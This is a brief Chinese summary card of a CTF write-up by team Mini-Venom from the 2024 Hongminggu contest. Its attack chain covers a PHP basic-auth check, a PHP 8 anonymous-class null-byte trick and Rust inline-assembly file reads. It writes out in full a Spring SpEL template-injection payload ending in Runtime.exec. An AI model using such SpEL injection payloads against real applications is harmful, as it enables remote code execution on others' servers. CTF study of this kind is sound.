---
title: "2024 第四届红明谷 WriteUp By Mini-Venom（PHP 8 anonymous class + Spring SpEL + Rust 内联汇编）"
category: web
tags: ["2024 第四届红明谷", "web", "红明谷 chips 线性变换 LLL", "PHP Basic auth admin/2e525e29e465f45d8d7c56319fe73036", "Spring SpEL T(java.lang.Boolean).forName", "T(Runtime).getRuntime().exec('calc')"]
signals: ["2024 第四届红明谷 2024", "红明谷 chips 线性变换 LLL", "PHP Basic auth admin/2e525e29e465f45d8d7c56319fe73036", "Spring SpEL T(java.lang.Boolean).forName", "T(Runtime).getRuntime().exec('calc')", "class@anonymous 0x00 截断", "ezphpPhp8 路由", "SpringTemplateEngine.process", "Rust 内联汇编 sys_open+sys_read+sys_write ORW", "rce", "ssti", "web_unknown", "pwn_unknown", "Mini-Venom"]
difficulty: medium
source: "https://www.ctfiot.com/172270.html"
tools: ["PHP", "Rust", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2024 第四届红明谷 WriteUp By Mini-Venom（PHP 8 anonymous class + Spring SpEL + Rust 内联汇编）

> 赛事：2024 第四届红明谷 2024 | 方向：web | 难度：medium | 工具：PHP、Rust、Spring

## 一句话总结

红明谷 Mini-Venom 综合：PHP Basic 鉴权 + Spring SpEL RCE + PHP 8 anonymous class 文件名 0x00 截断 + Rust 内联汇编 ORW + chips LLL。

## 攻击链

1. PHP 鉴权: $_SERVER[''PHP_AUTH_USER''] 校验 admin/2e525e29e465f45d8d7c56319fe73036
2. Spring SpEL: [[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance().readValue("{}",...SpelExpressionParser).parseExpression("T(Runtime).getRuntime().exec(''calc'')").getValue()}]]
3. /flag.php?ezphpPhp8=ko1sh1 trigger highlight_file
4. class@anonymous\x00/var/www/html/flag.php:7$0 文件名截断 + dump 调试
5. Rust inline asm: sys_open("/flag\0", O_RDONLY) → sys_read(fd, buf) → sys_write(1, buf)
6. crypto chips 线性变换 → 对 S 求 LLL

## 关键 payload

```
Spring SpEL: T(Runtime).getRuntime().exec(''calc'')
```

## 经验教训

Spring SpEL 注入通过 `[[${...}]]` 触发，`T(Class).forName` 反射调用是经典 payload；PHP 8 class@anonymous 0x00 截断是高版本 PHP 调试输出文件名的常用技巧；Rust core::arch::asm! 内联汇编做 ORW 是 2024 新趋势。

## 标签

红明谷 chips 线性变换 LLL、PHP Basic auth admin/2e525e29e465f45d8d7c56319fe73036、Spring SpEL T(java.lang.Boolean).forName、T(Runtime).getRuntime().exec('calc')、class@anonymous 0x00 截断、ezphpPhp8 路由、SpringTemplateEngine.process、Rust 内联汇编 sys_open+sys_read+sys_write ORW

## 参考来源

- https://www.ctfiot.com/172270.html
- 原文件：2024第四届红明谷_WriteUp_By_Mini-Venom.full.md
